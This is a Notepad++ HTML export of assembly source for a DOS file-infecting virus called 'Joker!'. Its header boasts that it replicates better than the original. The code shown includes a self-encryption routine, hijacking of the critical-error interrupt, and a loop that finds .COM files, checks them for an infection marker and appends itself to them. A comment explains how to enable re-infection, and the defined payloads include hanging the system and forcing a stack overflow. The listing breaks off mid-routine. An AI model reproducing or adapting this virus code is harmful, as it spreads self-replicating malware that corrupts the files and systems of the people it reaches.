<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc14 {
	font-weight: bold;
	color: #804000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">    </span><span class="sc9">title</span><span class="sc0"> </span><span class="sc3">" Joker! virus.  Written by The BOOT SECTOR Infector ... "</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Joker - This is a remake of the deceased "Joker/Jocker" virus.  The original</span><span class="sc0">
</span><span class="sc1">;     had multiple programming errors in it that kept it from replicating.</span><span class="sc0">
</span><span class="sc1">;     My version is much more successful.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


                            </span><span class="sc9">page</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0">                        </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'code'</span><span class="sc0">
                            </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
                            </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">main</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc1">;edure</span><span class="sc0">


</span><span class="sc1">;EQUates...</span><span class="sc0">
    </span><span class="sc5">idc</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">69h</span><span class="sc0">     </span><span class="sc1">;ID character - (note: 69)</span><span class="sc0">
    </span><span class="sc5">cr</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">      </span><span class="sc1">;ASCII for carriage return</span><span class="sc0">
    </span><span class="sc5">lf</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">      </span><span class="sc1">;ASCII for line feed</span><span class="sc0">

</span><span class="sc1">;End codes.  These determine what happens after the string is displayed.</span><span class="sc0">

    </span><span class="sc5">terminate</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;Terminate program after display</span><span class="sc0">
    </span><span class="sc5">halt</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">;Cause the system to hang after display</span><span class="sc0">
    </span><span class="sc5">SimulateCritErr</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">;Simulate the critical error handler</span><span class="sc0">
    </span><span class="sc5">return2host</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">   </span><span class="sc1">;Resume program immediately</span><span class="sc0">
    </span><span class="sc5">FlashFloppy</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">   </span><span class="sc1">;Wait for a key, then reset Drive A:</span><span class="sc0">
    </span><span class="sc5">WaitKey</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">   </span><span class="sc1">;Wait for a key, then resume program</span><span class="sc0">
    </span><span class="sc5">PauseKey</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">   </span><span class="sc1">;Same thing, but uses a pause message</span><span class="sc0">
    </span><span class="sc5">StackError</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">   </span><span class="sc1">;Cause a stack overflow (halts system)</span><span class="sc0">



</span><span class="sc5">tof</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;Top-Of-File</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">               </span><span class="sc1">;Skip over program</span><span class="sc0">
</span><span class="sc5">idchar</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">idc</span><span class="sc0">             </span><span class="sc1">;ID character</span><span class="sc0">

</span><span class="sc5">HostProgram</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">nop</span><span class="sc0">                 </span><span class="sc1">;First run copy only!</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">                 </span><span class="sc1">;First run copy only!</span><span class="sc0">

</span><span class="sc5">first_four</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">nop</span><span class="sc0">                 </span><span class="sc1">;First run copy only!</span><span class="sc0">
</span><span class="sc5">address</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">             </span><span class="sc1">;First run copy only!</span><span class="sc0">
</span><span class="sc5">check</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">nop</span><span class="sc0">                 </span><span class="sc1">;First run copy only!</span><span class="sc0">

</span><span class="sc5">begin</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">nextline</span><span class="sc0">            </span><span class="sc1">;Push IP+3 onto stack</span><span class="sc0">
</span><span class="sc5">nextline</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">              </span><span class="sc1">;mov    bp,ip</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nextline</span><span class="sc0">      </span><span class="sc1">;bp=disp. for mem locs</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">;Save AX</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cryptor</span><span class="sc0">             </span><span class="sc1">;Decrypt</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">retloc</span><span class="sc0">            </span><span class="sc1">;Continue program</span><span class="sc0">

</span><span class="sc5">cryptor</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">encrypt_val</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;encrypt val</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">toec</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;Top Of Encrypted Code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">eoec</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">toec</span><span class="sc0">  </span><span class="sc1">;Length of  "      "</span><span class="sc0">
</span><span class="sc5">cryptorloop</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">             </span><span class="sc1">;en/de crypt</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">               </span><span class="sc1">;change code #</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">;Next char please!</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cryptorloop</span><span class="sc0">         </span><span class="sc1">;loop if necessary</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;Return to caller</span><span class="sc0">
        
</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cryptor</span><span class="sc0">             </span><span class="sc1">;Encrypt code</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">;Restore CX for INT 21</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cryptor</span><span class="sc0">             </span><span class="sc1">;Decrypt code</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;Go back</span><span class="sc0">

</span><span class="sc5">toec</span><span class="sc4">:</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴훂op Of Encrypted Code</span><span class="sc0">
</span><span class="sc5">InfectIt</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">;Save CX for sub</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">

</span><span class="sc5">retloc</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">;Restore AX</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">               </span><span class="sc1">;DI = 0</span><span class="sc0">

        </span><span class="sc6">cli</span><span class="sc0">                 </span><span class="sc1">;Disable interrupts</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">               </span><span class="sc1">;Set up stack at:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">2F0h</span><span class="sc0">             </span><span class="sc1">;   0000:02F0</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">                 </span><span class="sc1">;Enable interrupts</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">96h</span><span class="sc0">              </span><span class="sc1">;Vector for INT 24h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;BX = offset in segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;CX = segment</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int24handler</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;CS:DX -} local handler</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">          </span><span class="sc1">;Save offset</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">            </span><span class="sc1">;Save segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2F8h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Check operation mode</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">4643h</span><span class="sc0">            </span><span class="sc1">;'CF' if already TSRed</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">GoOn</span><span class="sc0">                </span><span class="sc1">;Nope, jmp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0">              </span><span class="sc1">;Yes, don't do anything</span><span class="sc0">

</span><span class="sc5">GoOn</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4Ch</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">;use unused part of PSP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4Eh</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; to save BX and CX</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">              </span><span class="sc1">;Copy CS ...</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">              </span><span class="sc1">; ... to DS</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infected</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;Reset infection count</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">max2kill</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;Stop after 3 or less</span><span class="sc0">

</span><span class="sc5">GoOn2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_four</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Original first 4 bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tof</span><span class="sc0">           </span><span class="sc1">;TOF never changes</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">                 </span><span class="sc1">;Read left-to-right</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">                   </span><span class="sc1">;Copy the 4 bytes</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">                   </span><span class="sc1">;Copy the 4 bytes</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">              </span><span class="sc1">;Set DTA address ...</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DTA</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; ... to *our* DTA</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to set DTA</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">              </span><span class="sc1">;Find First ASCIIZ</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filespec</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;DS:DX -} '*.COM',0</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;Point to file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">;Save DX</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc0">          </span><span class="sc1">;Continue...</span><span class="sc0">

</span><span class="sc5">return</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">              </span><span class="sc1">;Set DTA address ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">              </span><span class="sc1">; ... to default DTA</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to set DTA</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">               </span><span class="sc1">;DI= 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">               </span><span class="sc1">;ES= 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">96h</span><span class="sc0">              </span><span class="sc1">;Vector for INT 24h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4Ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Restore from saved BX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">;Place back into vector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4Eh</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Restore from saved CX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">      </span><span class="sc1">;Place back into vector</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">              </span><span class="sc1">;Move CS ...</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">              </span><span class="sc1">; ... to ES</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SavedAX</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;Restore AX</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">;BX= 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">;CX= 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">;DX= 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">               </span><span class="sc1">;SI= 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">               </span><span class="sc1">;DI= 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">0FFFEh</span><span class="sc0">           </span><span class="sc1">;SP= FFFEh (normal)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">             </span><span class="sc1">;BP= 100h (RETurn addr)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">              </span><span class="sc1">; Put on stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;BP= 0</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;JMP to 100h</span><span class="sc0">

</span><span class="sc5">nextfile</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">;Did we open the file?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">skipclose</span><span class="sc0">           </span><span class="sc1">;No, so don't close it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">              </span><span class="sc1">;Close file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to close it</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">;Set BX back to 0</span><span class="sc0">
</span><span class="sc5">skipclose</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">              </span><span class="sc1">;Find Next ASCIIZ</span><span class="sc0">

</span><span class="sc5">continue</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">;Restore DX</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">;Re-save DX</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">;CX= 0</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Find First/Next</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">skipjmp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NoneLeft</span><span class="sc0">            </span><span class="sc1">;Out of files</span><span class="sc0">

</span><span class="sc5">skipjmp</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">            </span><span class="sc1">;open file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">               </span><span class="sc1">;point to filespec</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to open file</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">nextfile</span><span class="sc0">            </span><span class="sc1">;Next file if error</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;get the handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">              </span><span class="sc1">;Read from file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                </span><span class="sc1">;Read 4 bytes</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_four</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Read in the first 4</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to read</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">check</span><span class="sc4">],</span><span class="sc5">idc</span><span class="sc0">  </span><span class="sc1">;Already infected?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">nextfile</span><span class="sc0">            </span><span class="sc1">;Yep, try again ...</span><span class="sc0">
</span><span class="sc1">;NOTE: Delete the two lines above if you want it to re-infected programs.</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_four</span><span class="sc4">],</span><span class="sc2">77</span><span class="sc0">  </span><span class="sc1">;Mis-named .EXE?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">nextfile</span><span class="sc0">            </span><span class="sc1">;Yep, maybe next time!</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">            </span><span class="sc1">;LSeek to EOF</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">;CX= 0</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">               </span><span class="sc1">;DX= 0</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;Call DOS to LSeek</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc0">             </span><span class="sc1">;Longer than 62K?</span><span class="sc0">
